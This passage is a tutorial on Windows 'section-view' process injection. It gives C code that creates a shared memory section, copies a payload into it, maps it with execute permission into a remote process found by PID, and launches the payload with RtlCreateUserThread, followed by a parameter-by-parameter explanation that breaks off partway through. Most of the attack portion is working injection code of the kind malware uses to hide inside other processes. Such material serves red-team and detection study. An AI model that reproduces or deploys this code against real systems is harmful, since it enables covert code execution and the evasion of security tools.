# Section-View Injection

[MSDN](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/section-objects-and-views) describes Sections and Views as:

> A section object represents a section of memory that can be shared. A process can use a section object to share parts of its memory address space (memory sections) with other processes. Section objects also provide the mechanism by which a process can map a file into its memory address space.

> Each memory section has one or more corresponding views. A view of a section is a part of the section that is actually visible to a process. The act of creating a view for a section is known as mapping a view of the section. Each process that is manipulating the contents of a section has its own view; a process can also have multiple views (to the same or different sections).

Essentially, this allows processes to share memory regions with each other and henceforth, we will see how we can use this mechanism to inject code into a remote process. 

## The Code

Starting off with the `main()` function, we follow the usual convention of finding the PID of the target process and then passing it on as a parameter to the `inject_section_view()` function which contains the injection code.

```c
int main() {
    DWORD pid = find_pid(TARGET);
    int result = inject_section_view(pid);
    return 0;
}
```

The `inject_section_view()` function has the following structure:
```c
// map section views injection
int inject_section_view(DWORD pid) {
	CLIENT_ID cid;
    NTSTATUS status; 
    HANDLE hThread = NULL;
    HANDLE hSection = NULL;
    PVOID pLocalView = NULL; 
    PVOID pRemoteView = NULL;

    // Resolve Functions
    HMODULE hNtdll = GetModuleHandle("NTDLL.DLL");
	NtCreateSection_t pNtCreateSection = (NtCreateSection_t) GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection_t pNtMapViewOfSection = (NtMapViewOfSection_t) GetProcAddress(hNtdll, "NtMapViewOfSection");
	RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t) GetProcAddress(hNtdll, "RtlCreateUserThread");
    FreeLibrary(hNtdll);

    // Create and map Section
	status = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER) &payload_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    status = pNtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalView, NULL, NULL, NULL, (SIZE_T *)&payload_len, ViewUnmap, NULL, PAGE_READWRITE);
    memcpy(pLocalView, payload, payload_len);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	status = pNtMapViewOfSection(hSection, hProcess, &pRemoteView, NULL, NULL, NULL, (SIZE_T *) &payload_len, ViewUnmap, NULL, PAGE_EXECUTE_READ);
	
    // Create thread
    status = pRtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, pRemoteView, 0, &hThread, &cid);
	int _result = WaitForSingleObject(hThread, -1);
    CloseHandle(hThread);
    CloseHandle(hSection);
    CloseHandle(hProcess);
    return 0;
}
```

The program can be roughly divided into three parts. We begin with dynamically resolving the addresses of  `NtCreateSection`, `NtMapViewOfSection` and `RtlCreateUserThread` from `NtDLL` using a combination of `GetModuleHandle()` and `GetProcAddress()`. Once we have the addresses we need, we free the module handle with `FreeLibrary()` because that is the right thing to do 🥰

Next up, we use `NtCreateSection()` to create a section object with the following parameters: 
- `&hSection`: This is a pointer to a HANDLE variable that will receive the handle to the created section object. 
- `SECTION_ALL_ACCESS`: This parameter specifies the desired access rights for the section object. In this case, we want to have all possible access rights to the section including read, write, and execute permissions, among others.
- `NULL`: This parameter represents a pointer to a `SECURITY_DESCRIPTOR` structure, which is used to control security settings for the object. Passing `NULL` indicates that the default security settings should be used.
- `(PLARGE_INTEGER) &payload_len`: This indicates the size of the section object to be created. In this case, we type cast the address of the variable holding the size of the payload(`&payload_len`) to a `PLARGE_INTEGER`.
- `SEC_COMMIT`: This parameter specifies that the memory for the section should be immediately allocated and committed, making it available for use.
- `NULL`: This parameter represents a pointer to a `SEC_IMAGE_INFORMATION` structure. It's used for image files and can be safely set to `NULL` when not applicable.

Once the section object has been created, then we map it to the current process's virtual address space using `NtMapViewOfSection()`
